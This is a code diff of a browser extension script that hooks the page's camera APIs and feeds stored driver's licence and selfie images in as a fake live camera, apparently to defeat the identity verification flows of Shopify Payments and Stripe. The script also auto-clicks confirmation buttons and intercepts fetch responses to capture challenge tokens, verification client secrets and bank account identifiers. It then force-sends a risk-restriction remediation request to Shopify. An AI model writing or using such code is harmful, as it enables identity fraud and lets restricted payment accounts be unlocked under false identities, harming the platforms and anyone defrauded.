@@ -1,30 +1,29 @@
-// MAIN world — runs at document_start BEFORE any page JS
-// Aggressively overrides camera APIs at prototype level
+// MAIN world — document_start — patches camera BEFORE any page script runs
 
 ;(function IDVPatcher() {
 
-// Safe sessionStorage wrappers — sandboxed iframes throw SecurityError
+// Safe sessionStorage (sandboxed iframes throw SecurityError)
 function ssGet(k)    { try { return sessionStorage.getItem(k) }  catch(_) { return null } }
 function ssSet(k, v) { try { sessionStorage.setItem(k, v) }      catch(_) {} }
 
-// IMAGE STORE — sync from sessionStorage + async via postMessage
+// ── Image store ───────────────────────────────────────────────────────────────
 const IDV = {
-  dlFront: ssGet('__idv_dl_front__'),
-  dlBack:  ssGet('__idv_dl_back__'),
-  selfies: [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
-  phase:   ssGet('__idv_phase__') || 'id',
-  idStep:  0,
-  cameraActive: false
+  dlFront:  ssGet('__idv_dl_front__'),
+  dlBack:   ssGet('__idv_dl_back__'),
+  selfies:  [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
+  phase:    ssGet('__idv_phase__') || 'id',
+  idStep:   0,
+  camActive: false
 }
 
 window.addEventListener('message', ev => {
   if (ev.source !== window || ev.data?._idv !== 'IDV_SET') return
   const d = ev.data
-  if (d.dlFront)        IDV.dlFront  = d.dlFront
-  if (d.dlBack)         IDV.dlBack   = d.dlBack
-  if (d.selfies?.length) IDV.selfies = d.selfies
-  if (d.phase)          IDV.phase    = d.phase
-  console.log('[IDV] ✓ Images loaded. dlFront=' + !!IDV.dlFront + ' selfies=' + IDV.selfies.length)
+  if (d.dlFront)         IDV.dlFront  = d.dlFront
+  if (d.dlBack)          IDV.dlBack   = d.dlBack
+  if (d.selfies?.length) IDV.selfies  = d.selfies
+  if (d.phase)           IDV.phase    = d.phase
+  console.log('[IDV] Images received. dlFront=' + !!IDV.dlFront + ' selfies=' + IDV.selfies.length)
   updateBadge()
 })
 
@@ -33,115 +32,97 @@ function pickSrc() {
   return IDV.idStep === 1 ? (IDV.dlBack || IDV.dlFront) : IDV.dlFront
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// VISUAL BADGE — shows if fake camera is ready
-// ─────────────────────────────────────────────────────────────────────────────
+// ── On-screen badge ───────────────────────────────────────────────────────────
 let badge = null
-function createBadge() {
+function initBadge() {
   if (badge || !document.body) return
   badge = document.createElement('div')
-  badge.id = '__idv_badge__'
-  badge.style.cssText = [
-    'position:fixed','bottom:12px','right:12px','z-index:2147483647',
-    'padding:5px 10px','border-radius:20px','font-size:11px','font-family:monospace',
-    'font-weight:700','pointer-events:none','transition:all 0.3s',
-    'box-shadow:0 2px 8px rgba(0,0,0,0.4)'
-  ].join(';')
+  badge.style.cssText = 'position:fixed;bottom:10px;right:10px;z-index:2147483647;' +
+    'padding:4px 12px;border-radius:20px;font-size:11px;font-family:monospace;font-weight:700;' +
+    'pointer-events:none;transition:background .3s,color .3s;box-shadow:0 2px 8px rgba(0,0,0,.5)'
   document.body.appendChild(badge)
   updateBadge()
 }
 function updateBadge() {
   if (!badge) return
-  const hasImg = !!IDV.dlFront
-  const active = IDV.cameraActive
-  if (active) {
-    badge.textContent = '⬡ IDV CAM ACTIVE'
-    badge.style.background = '#052005'
-    badge.style.color = '#4ade80'
-    badge.style.border = '1px solid #14532d'
-  } else if (hasImg) {
-    badge.textContent = '⬡ IDV READY'
-    badge.style.background = '#030d2d'
-    badge.style.color = '#60a5fa'
-    badge.style.border = '1px solid #1d4ed8'
+  if (IDV.camActive) {
+    badge.style.background = '#052005'; badge.style.color = '#4ade80'
+    badge.style.border = '1px solid #14532d'; badge.textContent = '⬡ IDV CAM ACTIVE'
+  } else if (IDV.dlFront) {
+    badge.style.background = '#030d2d'; badge.style.color = '#60a5fa'
+    badge.style.border = '1px solid #1d4ed8'; badge.textContent = '⬡ IDV READY'
   } else {
-    badge.textContent = '⬡ IDV NO IMAGE'
-    badge.style.background = '#1a0505'
-    badge.style.color = '#f87171'
-    badge.style.border = '1px solid #7f1d1d'
+    badge.style.background = '#1a0505'; badge.style.color = '#f87171'
+    badge.style.border = '1px solid #7f1d1d'; badge.textContent = '⬡ IDV NO IMAGE'
   }
 }
-if (document.readyState === 'loading') {
-  document.addEventListener('DOMContentLoaded', createBadge)
-} else {
-  createBadge()
+function showToast(msg, bg) {
+  if (!document.body) return
+  const t = document.createElement('div')
+  t.style.cssText = 'position:fixed;top:14px;left:50%;transform:translateX(-50%);z-index:2147483647;' +
+    'padding:8px 20px;border-radius:8px;font-size:12px;font-family:monospace;font-weight:700;' +
+    'color:#fff;background:' + (bg||'#1e3a5f') + ';box-shadow:0 3px 14px rgba(0,0,0,.6);pointer-events:none'
+  t.textContent = msg
+  document.body.appendChild(t)
+  setTimeout(() => t.remove(), 3500)
 }
+if (document.body) initBadge()
+else document.addEventListener('DOMContentLoaded', initBadge)
 
-// ─────────────────────────────────────────────────────────────────────────────
-// BUILD FAKE STREAM
-// ─────────────────────────────────────────────────────────────────────────────
-async function loadImg(src) {
+// ── Load image helper ─────────────────────────────────────────────────────────
+function loadImg(src) {
   return new Promise(resolve => {
+    if (!src) return resolve(null)
     const i = new Image()
     i.onload  = () => resolve(i)
-    i.onerror = () => { console.log('[IDV] ✗ Image load error'); resolve(null) }
+    i.onerror = () => { console.log('[IDV] ✗ Image failed to load'); resolve(null) }
     setTimeout(() => resolve(null), 6000)
     i.src = src
   })
 }
 
+// ── Build fake video stream ───────────────────────────────────────────────────
 async function buildFakeStream(src) {
-  console.log('[IDV] Building fake stream, src length=' + src?.length)
+  console.log('[IDV] Building stream, src length=' + (src?.length || 0))
   const img = await loadImg(src)
-  if (!img) { console.log('[IDV] ✗ Could not load image'); return null }
-  console.log('[IDV] ✓ Image loaded:', img.naturalWidth + 'x' + img.naturalHeight)
+  if (!img) { console.log('[IDV] ✗ No image'); return null }
+  console.log('[IDV] Image loaded: ' + img.naturalWidth + 'x' + img.naturalHeight)
 
   const W = 1280, H = 720
   const canvas = document.createElement('canvas')
   canvas.width = W; canvas.height = H
-  const ctx = canvas.getContext('2d', { willReadFrequently: false })
+  const ctx = canvas.getContext('2d')
 
-  const scaleBase = Math.min(W / img.naturalWidth, H / img.naturalHeight) * 0.86
-  let ox = 0, oy = 0, sc = 1.0
-  let vx = 0.18, vy = 0.12, vs = 0.00012
+  const baseScale = Math.min(W / img.naturalWidth, H / img.naturalHeight) * 0.86
+  let ox = 0, oy = 0, sc = 1, vx = 0.15, vy = 0.1, vs = 0.0001
 
-  function frame() {
+  function draw() {
     ox += vx; oy += vy; sc += vs
-    if (Math.abs(ox) > 9)  vx *= -1
-    if (Math.abs(oy) > 6)  vy *= -1
-    if (sc > 1.02 || sc < 0.98) vs *= -1
-
-    const s  = scaleBase * sc
-    const iw = img.naturalWidth * s
-    const ih = img.naturalHeight * s
-    const x  = (W - iw) / 2 + ox
-    const y  = (H - ih) / 2 + oy
-
+    if (Math.abs(ox) > 8)   vx *= -1
+    if (Math.abs(oy) > 5)   vy *= -1
+    if (sc > 1.018 || sc < 0.982) vs *= -1
+    const s = baseScale * sc
     ctx.fillStyle = '#111'
     ctx.fillRect(0, 0, W, H)
-    ctx.drawImage(img, x, y, iw, ih)
-
+    ctx.drawImage(img, (W - img.naturalWidth*s)/2 + ox, (H - img.naturalHeight*s)/2 + oy, img.naturalWidth*s, img.naturalHeight*s)
     // Vignette
-    const vg = ctx.createRadialGradient(W/2, H/2, H*.33, W/2, H/2, H*.72)
-    vg.addColorStop(0, 'rgba(0,0,0,0)')
-    vg.addColorStop(1, 'rgba(0,0,0,0.22)')
-    ctx.fillStyle = vg
-    ctx.fillRect(0, 0, W, H)
+    const g = ctx.createRadialGradient(W/2, H/2, H*.32, W/2, H/2, H*.72)
+    g.addColorStop(0, 'rgba(0,0,0,0)'); g.addColorStop(1, 'rgba(0,0,0,0.2)')
+    ctx.fillStyle = g; ctx.fillRect(0, 0, W, H)
   }
-  frame()
+  draw()
 
-  let stream = null
-  let stopFn  = () => {}
+  let stream, stopFn
 
   // Try MediaStreamTrackGenerator (Chrome 94+)
-  if (typeof MediaStreamTrackGenerator !== 'undefined') {
+  if (typeof MediaStreamTrackGenerator !== 'undefined' && typeof VideoFrame !== 'undefined') {
     try {
       const gen = new MediaStreamTrackGenerator({ kind: 'video' })
       const writer = gen.writable.getWriter()
       let alive = true
       async function pump(ts) {
         if (!alive) return
-        frame()
+        draw()
         const vf = new VideoFrame(canvas, { timestamp: Math.floor(ts * 1000), duration: 33333 })
         try { await writer.write(vf) } catch(_) {}
         vf.close()
@@ -150,45 +131,42 @@ async function buildFakeStream(src) {
       requestAnimationFrame(pump)
       stream = new MediaStream([gen])
       stopFn = () => { alive = false; try { writer.close() } catch(_) {} }
-      console.log('[IDV] ✓ Using MediaStreamTrackGenerator')
-    } catch(e) {
-      console.log('[IDV] TrackGenerator error:', e.message)
-      stream = null
-    }
+      console.log('[IDV] ✓ MediaStreamTrackGenerator')
+    } catch(e) { console.log('[IDV] TrackGenerator failed:', e.message); stream = null }
   }
 
   // Fallback: canvas.captureStream
   if (!stream) {
-    const iv = setInterval(frame, 33)
+    const iv = setInterval(draw, 33)
     stream = canvas.captureStream(30)
     stopFn = () => clearInterval(iv)
-    console.log('[IDV] ✓ Using canvas.captureStream')
+    console.log('[IDV] ✓ canvas.captureStream')
   }
 
   // Spoof track metadata
   const track = stream.getVideoTracks()[0]
   if (track) {
-    track.getSettings     = () => ({ width: W, height: H, frameRate: 30, facingMode: IDV.phase === 'selfie' ? 'user' : 'environment', deviceId: 'idv-cam', groupId: 'idv-grp' })
-    track.getCapabilities = () => ({ width: { min:1, max:1920 }, height: { min:1, max:1080 }, frameRate: { min:1, max:60 }, facingMode: ['user','environment'] })
+    track.getSettings     = () => ({ width:W, height:H, frameRate:30, facingMode: IDV.phase==='selfie'?'user':'environment', deviceId:'idv-cam', groupId:'idv-grp' })
+    track.getCapabilities = () => ({ width:{min:1,max:1920}, height:{min:1,max:1080}, frameRate:{min:1,max:60} })
     track.getConstraints  = () => ({})
     const origStop = track.stop.bind(track)
-    track.stop = () => { stopFn(); origStop(); IDV.cameraActive = false; updateBadge() }
+    track.stop = () => { stopFn?.(); origStop(); IDV.camActive = false; updateBadge() }
   }
 
-  IDV.cameraActive = true
+  IDV.camActive = true
   updateBadge()
   return stream
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// OVERRIDE getUserMedia — PROTOTYPE LEVEL (most aggressive)
-// ─────────────────────────────────────────────────────────────────────────────
-if (typeof MediaDevices !== 'undefined') {
-  const _origProtoGUM = MediaDevices.prototype.getUserMedia
+// ── CAMERA HOOK — Triple-layer override ──────────────────────────────────────
+const _realMD  = navigator.mediaDevices
+const _origGUM = _realMD?.getUserMedia?.bind(_realMD)
+const _origED  = _realMD?.enumerateDevices?.bind(_realMD)
 
+if (_origGUM) {
   const fakeGUM = async function fakeGetUserMedia(constraints) {
-    console.log('[IDV] getUserMedia intercepted, video=' + !!constraints?.video)
-    if (!constraints?.video) return _origProtoGUM.call(this, constraints)
+    console.log('[IDV] getUserMedia CALLED! video=' + !!constraints?.video)
+    if (!constraints?.video) return _origGUM(constraints)
 
     // Wait up to 8s for images
     for (let i = 0; i < 40; i++) {
@@ -197,182 +175,164 @@ if (typeof MediaDevices !== 'undefined') {
       if (ss) { IDV.dlFront = ss; break }
       await new Promise(r => setTimeout(r, 200))
     }
+    console.log('[IDV] dlFront available:', !!IDV.dlFront)
 
     const src = pickSrc()
     if (!src) {
-      console.log('[IDV] ✗ No image stored — using real camera. Upload DL in side panel!')
-      return _origProtoGUM.call(this, constraints)
+      showToast('⬡ IDV: Upload DL image first!', '#7f1d1d')
+      return _origGUM(constraints)
     }
 
+    showToast('⬡ IDV: Injecting fake camera…', '#1e3a5f')
     const fake = await buildFakeStream(src)
     if (!fake) {
-      console.log('[IDV] ✗ Stream build failed — real camera fallback')
-      return _origProtoGUM.call(this, constraints)
+      showToast('⬡ IDV: Stream failed — real camera', '#7f1d1d')
+      return _origGUM(constraints)
     }
 
-    console.log('[IDV] ✓ Returning FAKE stream!')
+    showToast('⬡ IDV: FAKE CAMERA ACTIVE!', '#052e16')
     return fake
   }
 
-  // Replace on prototype — affects ALL MediaDevices instances
-  // Use defineProperty so it can't be overwritten easily
-  Object.defineProperty(MediaDevices.prototype, 'getUserMedia', {
-    get() { return fakeGUM },
-    set(v) { /* block overwrites */ },
-    configurable: true
-  })
-
-  // Also override on the navigator.mediaDevices instance directly
-  try {
-    Object.defineProperty(navigator.mediaDevices, 'getUserMedia', {
-      get() { return fakeGUM },
-      set(v) {},
-      configurable: true
-    })
-  } catch(_) {}
-
-  // Legacy APIs (some older Shopify code might use these)
-  try { navigator.getUserMedia      = (c,s,e) => fakeGUM.call(navigator.mediaDevices, c).then(s).catch(e) } catch(_) {}
-  try { navigator.webkitGetUserMedia = (c,s,e) => fakeGUM.call(navigator.mediaDevices, c).then(s).catch(e) } catch(_) {}
-  try { navigator.mozGetUserMedia    = (c,s,e) => fakeGUM.call(navigator.mediaDevices, c).then(s).catch(e) } catch(_) {}
-
-  // Spoof enumerateDevices
-  const _origEnum = MediaDevices.prototype.enumerateDevices
-  MediaDevices.prototype.enumerateDevices = async function() {
-    const real = await _origEnum.call(this).catch(() => [])
+  const fakeED = async function() {
+    const real = await _origED().catch(() => [])
     if (!real.some(d => d.kind === 'videoinput')) {
-      real.unshift({ deviceId: 'idv-cam', groupId: 'idv-grp', kind: 'videoinput', label: 'IDV Virtual Camera', toJSON() { return this } })
+      real.unshift({ deviceId:'idv-cam', groupId:'idv-grp', kind:'videoinput', label:'IDV Virtual Camera', toJSON(){ return this } })
     }
     return real
   }
 
+  // LAYER 1: Replace navigator.mediaDevices with Proxy (strongest)
+  try {
+    Object.defineProperty(navigator, 'mediaDevices', {
+      get() {
+        return new Proxy(_realMD, {
+          get(t, p) {
+            if (p === 'getUserMedia')    return fakeGUM
+            if (p === 'enumerateDevices') return fakeED
+            const v = t[p]; return typeof v === 'function' ? v.bind(t) : v
+          }
+        })
+      },
+      configurable: true
+    })
+    console.log('[IDV] ✓ Layer 1: navigator.mediaDevices Proxy installed')
+  } catch(e) { console.log('[IDV] Layer 1 failed:', e.message) }
+
+  // LAYER 2: Prototype override
+  if (typeof MediaDevices !== 'undefined') {
+    try {
+      Object.defineProperty(MediaDevices.prototype, 'getUserMedia', {
+        get() { return fakeGUM }, set() {}, configurable: true
+      })
+      console.log('[IDV] ✓ Layer 2: MediaDevices.prototype patched')
+    } catch(e) { console.log('[IDV] Layer 2 failed:', e.message) }
+  }
+
+  // LAYER 3: Legacy global APIs
+  try { navigator.getUserMedia       = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}
+  try { navigator.webkitGetUserMedia = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}
+
   // ImageCapture override
   if (typeof ImageCapture !== 'undefined') {
     const _OIC = ImageCapture
-    window.ImageCapture = class IDVImageCapture {
-      constructor(track) { this._track = track; this._real = new _OIC(track) }
+    window.ImageCapture = class {
+      constructor(track) { this._t = track; this._r = new _OIC(track) }
       async grabFrame() {
-        const src = pickSrc(); if (!src) return this._real.grabFrame()
-        const img = await loadImg(src); if (!img) return this._real.grabFrame()
-        return createImageBitmap(img)
+        const i = await loadImg(pickSrc()); if (!i) return this._r.grabFrame()
+        return createImageBitmap(i)
       }
       async takePhoto(o) {
-        const src = pickSrc(); if (!src) return this._real.takePhoto(o)
-        const img = await loadImg(src); if (!img) return this._real.takePhoto(o)
+        const i = await loadImg(pickSrc()); if (!i) return this._r.takePhoto(o)
         const c = document.createElement('canvas')
-        c.width = img.naturalWidth; c.height = img.naturalHeight
-        c.getContext('2d').drawImage(img, 0, 0)
+        c.width = i.naturalWidth; c.height = i.naturalHeight
+        c.getContext('2d').drawImage(i, 0, 0)
         return new Promise(r => c.toBlob(r, 'image/jpeg', 0.95))
       }
-      getPhotoCapabilities() { return this._real.getPhotoCapabilities() }
-      getPhotoSettings()     { return this._real.getPhotoSettings() }
-      get track()            { return this._track }
+      get track() { return this._t }
+      getPhotoCapabilities() { return this._r.getPhotoCapabilities?.() }
+      getPhotoSettings()     { return this._r.getPhotoSettings?.() }
     }
   }
 
-  console.log('[IDV] ✓ Camera prototype patched on', location.hostname)
-  console.log('[IDV] dlFront ready:', !!IDV.dlFront)
+  console.log('[IDV] ✓ All camera layers active on', location.hostname)
+} else {
+  console.log('[IDV] No mediaDevices on this page')
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// AUTO-PHASE DETECTOR + AUTO-CLICK
-// ─────────────────────────────────────────────────────────────────────────────
-const SELFIE_W  = ['selfie','your face','look at the camera','photo of yourself','center your face','face forward']
+// ── Phase + auto-click DOM watcher ────────────────────────────────────────────
+const SELFIE_W  = ['selfie','your face','look at the camera','photo of yourself','center your face']
 const BACK_W    = ['back of','flip your','other side','back side','reverse']
-const ADVANCE_W = ['looks good','use this photo','use photo','confirm','captured','✓']
-const CLICK_BTN = ['looks good','use this photo','use photo','confirm','continue','next','submit','done','got it']
+const ADVANCE_W = ['looks good','use this photo','captured','✓ captured']
+const CLICK_W   = ['looks good','use this photo','use photo','confirm','continue','next','submit','done']
 
-let _lastText = ''
-function onDOMChange() {
-  const text = document.body?.innerText?.toLowerCase() || ''
-  if (text === _lastText) return
-  _lastText = text
-
-  if (IDV.phase === 'id' && IDV.idStep === 0 && BACK_W.some(w => text.includes(w))) {
-    IDV.idStep = 1
-    console.log('[IDV] → Back of ID step')
+let _lastTxt = ''
+function checkDOM() {
+  const txt = document.body?.innerText?.toLowerCase() || ''
+  if (txt === _lastTxt) return
+  _lastTxt = txt
+  if (IDV.phase === 'id' && IDV.idStep === 0 && BACK_W.some(w => txt.includes(w))) {
+    IDV.idStep = 1; console.log('[IDV] → back-of-ID')
   }
-  if (IDV.phase !== 'selfie' && SELFIE_W.some(w => text.includes(w))) {
-    IDV.phase = 'selfie'
-    ssSet('__idv_phase__', 'selfie')
+  if (IDV.phase !== 'selfie' && SELFIE_W.some(w => txt.includes(w))) {
+    IDV.phase = 'selfie'; ssSet('__idv_phase__', 'selfie')
     window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'selfie' }, '*')
-    console.log('[IDV] → Selfie phase')
+    console.log('[IDV] → selfie phase')
   }
-  if (ADVANCE_W.some(w => text.includes(w))) {
-    setTimeout(doAutoClick, 900)
-  }
+  if (ADVANCE_W.some(w => txt.includes(w))) setTimeout(autoClick, 900)
 }
-
-function doAutoClick() {
-  const btns = [...document.querySelectorAll('button,[role="button"]')]
-    .filter(b => !b.disabled && b.offsetParent !== null)
-  for (const phrase of CLICK_BTN) {
+function autoClick() {
+  const btns = [...document.querySelectorAll('button,[role="button"]')].filter(b => !b.disabled && b.offsetParent)
+  for (const phrase of CLICK_W) {
     const b = btns.find(b => b.textContent?.toLowerCase().trim().includes(phrase))
     if (b) { console.log('[IDV] Auto-click:', b.textContent.trim()); b.click(); return }
   }
 }
-
 function watchDOM() {
   if (!document.body) { document.addEventListener('DOMContentLoaded', watchDOM); return }
-  new MutationObserver(onDOMChange).observe(document.body, { childList:true, subtree:true, characterData:true })
-  onDOMChange()
+  new MutationObserver(checkDOM).observe(document.body, { childList:true, subtree:true, characterData:true })
+  checkDOM()
 }
 watchDOM()
 
-// ─────────────────────────────────────────────────────────────────────────────
-// FETCH INTERCEPTOR
-// ─────────────────────────────────────────────────────────────────────────────
+// ── Fetch interceptor ─────────────────────────────────────────────────────────
 const FPAT = ['banking_home_banking','payments/banking','shopify/graphql','verificationhub.shopify.com','verify.stripe.com']
-
 function getStore() { return location.pathname.match(/\/store\/([^/?#]+)/)?.[1] ?? null }
-function gid2id(g)  { return g ? (String(g).match(/\/(\d+)$/)?.[1] ?? String(g)) : null }
+function gid(g) { return g ? (String(g).match(/\/(\d+)$/)?.[1] ?? String(g)) : null }
 
 function parseCaptures(url, data) {
-  const out = {}
+  const o = {}
   if (url.includes('banking_home_banking') || url.includes('payments/banking')) {
     const ba = data.bankAccount || data?.data?.bankAccount
-    if (ba?.id) { out.bank_account_id = gid2id(ba.id); out.bank_account_gid = ba.id }
-    const restr = ba?.riskRestrictions || []
-    const act = restr.find(r => r.status === 'ACTIVE')
-    if (act) { out.active_restriction_id = gid2id(act.id); out.active_restriction_gid = act.id; out.active_restriction_status = 'ACTIVE' }
+    if (ba?.id) { o.bank_account_id = gid(ba.id); o.bank_account_gid = ba.id }
+    const act = (ba?.riskRestrictions||[]).find(r => r.status==='ACTIVE')
+    if (act) { o.active_restriction_id = gid(act.id); o.active_restriction_gid = act.id; o.active_restriction_status = 'ACTIVE' }
     const pr = data.principal || data?.data?.principal
-    if (pr?.id) out.principal_id = gid2id(pr.id)
-    out._e = 'banking_home'
+    if (pr?.id) o.principal_id = gid(pr.id)
   }
   if (url.includes('shopify/graphql') || url.includes('verificationhub')) {
     const d = data.data || {}
-    const pgrr = d.payoutGateRemediate
-    if (pgrr?.challengeToken) { out.jwt = pgrr.challengeToken; out.jwt_type = 'pgrr'; out._e = 'pgrr' }
-    const rrr = d.remediateRiskRestriction
-    if (rrr?.challengeToken) { out.jwt = rrr.challengeToken; out.jwt_type = 'remediate'; out._e = 'remediate' }
+    if (d.payoutGateRemediate?.challengeToken)    { o.jwt = d.payoutGateRemediate.challengeToken; o.jwt_type = 'pgrr' }
+    if (d.remediateRiskRestriction?.challengeToken){ o.jwt = d.remediateRiskRestriction.challengeToken; o.jwt_type = 'remediate' }
     for (const k of Object.keys(d)) {
-      if (k.startsWith('createIVA') || k.startsWith('createIdentityVerification')) {
+      if (k.startsWith('createIVA')||k.startsWith('createIdentityVerification')) {
         const vs = d[k]?.verificationSession
-        if (vs) { out.ek = vs.id; out.ek_client_secret = vs.clientSecret; out.assessment_ref = vs.referenceId; out.civa_variant = k; out._e = 'civa'; break }
+        if (vs) { o.ek = vs.id; o.ek_client_secret = vs.clientSecret; o.assessment_ref = vs.referenceId; o.civa_variant = k; break }
       }
     }
-    const ca = d.createAssessment
-    if (ca?.assessmentReference) { out.vhub_assessment_ref = ca.assessmentReference; out._e = 'vhub' }
+    if (d.createAssessment?.assessmentReference) o.vhub_assessment_ref = d.createAssessment.assessmentReference
     const bh = d.shopifyPaymentsAccount?.bankAccount || d.bankAccount
-    if (bh?.riskRestrictions !== undefined) {
-      const hasAct = bh.riskRestrictions.some(r => r.status === 'ACTIVE')
-      out.discharge_detected = !hasAct
-      out._e = hasAct ? 'poll_active' : 'discharge'
-    }
+    if (bh?.riskRestrictions !== undefined) o.discharge_detected = !bh.riskRestrictions.some(r => r.status==='ACTIVE')
   }
-  if (url.includes('verify.stripe.com')) {
-    const s = data.session || data
-    if (s.status) { out.stripe_session_status = s.status; out._e = 'stripe_' + s.status }
-  }
-  return Object.keys(out).filter(k => !k.startsWith('_')).length > 0 ? out : null
+  if (url.includes('verify.stripe.com') && (data.session||data).status) o.stripe_session_status = (data.session||data).status
+  return Object.keys(o).length ? o : null
 }
 
 function sendCapture(url, data) {
   const c = parseCaptures(url, data)
-  if (c) window.postMessage({ _idv: 'CAPTURE', store: getStore(), url, captures: c, timestamp: Date.now() }, '*')
+  if (c) window.postMessage({ _idv:'CAPTURE', store:getStore(), url, captures:c, timestamp:Date.now() }, '*')
 }
 
-// Force verify
 window.addEventListener('message', async ev => {
   if (ev.source !== window || ev.data?._idv !== 'FORCE_VERIFY') return
   const csrf = document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || ''
@@ -380,17 +340,14 @@ window.addEventListener('message', async ev => {
   try {
     const res = await _origFetch('https://admin.shopify.com/api/shopify/graphql.json', {
       method:'POST', credentials:'include',
-      headers:{ 'Content-Type':'application/json', ...(csrf?{'X-CSRF-Token':csrf}:{}) },
-      body: JSON.stringify({ operationName:'RemediateIDV', query:mut, variables:{ id:ev.data.riskRestrictionId } })
+      headers:{'Content-Type':'application/json',...(csrf?{'X-CSRF-Token':csrf}:{})},
+      body:JSON.stringify({operationName:'RemediateIDV',query:mut,variables:{id:ev.data.riskRestrictionId}})
     })
     const data = await res.json()
     sendCapture('shopify/graphql', data)
     const rrr = data?.data?.remediateRiskRestriction
-    if (rrr?.challengeToken) window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result:{ ok:true } }, '*')
-    else window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result:{ ok:false, error: rrr?.userErrors?.map(e=>e.message).join(', ')||'error' } }, '*')
-  } catch(e) {
-    window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result:{ ok:false, error:String(e) } }, '*')
-  }
+    window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result: rrr?.challengeToken ? {ok:true} : {ok:false,error:rrr?.userErrors?.map(e=>e.message).join(',')||'error'} }, '*')
+  } catch(e) { window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result:{ok:false,error:String(e)} }, '*') }
 })
 
 const _origFetch = window.fetch.bind(window)
